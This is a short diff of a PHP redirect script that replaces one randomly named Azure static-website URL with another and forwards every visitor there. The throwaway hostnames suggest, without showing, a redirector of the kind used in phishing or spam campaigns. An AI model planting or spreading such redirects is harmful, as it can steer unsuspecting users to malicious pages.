@@ -1,5 +1,5 @@
 <?php
-$url = "https://gitcoreloopsss3d.z5.web.core.windows.net/";
+$url = "https://asssu7.z13.web.core.windows.net/";
 header('Location: '.$url);
 die();
 ?>
